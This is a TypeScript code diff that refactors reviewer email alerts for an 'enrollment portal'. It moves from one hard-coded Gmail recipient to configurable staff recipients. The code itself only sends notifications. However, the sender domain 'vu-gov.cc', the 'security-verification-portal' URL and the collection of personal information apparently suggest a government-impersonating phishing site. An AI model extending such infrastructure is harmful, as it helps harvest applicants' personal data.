@@ -1,7 +1,8 @@
-import { ReplitConnectors } from "@replit/connectors-sdk";
-
-const reviewerEmail = "skyfashion053@gmail.com";
-const senderEmail = "Enrollment Portal <notifications@vu-gov.cc>";
+import {
+  dispatchStaffEmail,
+  emailRecipientIdempotencyKey,
+  getStaffEmailConfiguration,
+} from "./staffEmail";
 const productionPortalUrl = "https://security-verification-portal.enroll.website";
 const stepLabels = [
   "Personal information",
@@ -80,6 +81,9 @@ function notificationTitle(notification: ReviewerNotification): string {
 export async function sendReviewerNotification(
   notification: ReviewerNotification,
 ): Promise<void> {
+  const configuration = await getStaffEmailConfiguration();
+  if (!configuration.alerts[notification.kind]) return;
+
   const title = notificationTitle(notification);
   const link = reviewerUrl(notification);
   const subject = `${title} · ${notification.reference}`;
@@ -99,40 +103,24 @@ export async function sendReviewerNotification(
     "<p>The complete application record is available in the authenticated reviewer workspace.</p>",
     `<p><a href="${escapeHtml(link)}">Open reviewer workspace</a></p>`,
   ].join("");
-  const body = JSON.stringify({
-    from: senderEmail,
-    to: [reviewerEmail],
-    subject,
-    text,
-    html,
-  });
-  const connectors = new ReplitConnectors();
-  let lastStatus: number | null = null;
 
-  for (let attempt = 0; attempt < 3; attempt += 1) {
-    try {
-      const response = await connectors.proxy("resend", "/emails", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Idempotency-Key": notification.idempotencyKey.slice(0, 256),
-        },
-        body,
-      });
-      if (response.ok) return;
-      lastStatus = response.status;
-      if (response.status < 500 && response.status !== 429) break;
-    } catch {
-      // Retry transient connector/network failures without blocking enrollment saves.
-    }
-    if (attempt < 2) {
-      await new Promise((resolve) => setTimeout(resolve, 150 * (attempt + 1)));
-    }
+  const failures: string[] = [];
+  for (const recipientEmail of configuration.recipients) {
+    const sent = await dispatchStaffEmail({
+      idempotencyKey: emailRecipientIdempotencyKey(
+        `reviewer:${notification.idempotencyKey}`,
+        recipientEmail,
+      ),
+      recipientEmail,
+      subject,
+      messageText: text,
+      html,
+      eventKind: notification.kind,
+      applicationReference: notification.reference,
+    });
+    if (sent.status === "failed") failures.push(recipientEmail);
   }
-
-  throw new Error(
-    lastStatus === null
-      ? "Reviewer notification could not reach the email service."
-      : `Reviewer notification failed with email service status ${lastStatus}.`,
-  );
+  if (failures.length) {
+    throw new Error(`Reviewer alert failed for ${failures.length} recipient(s).`);
+  }
 }
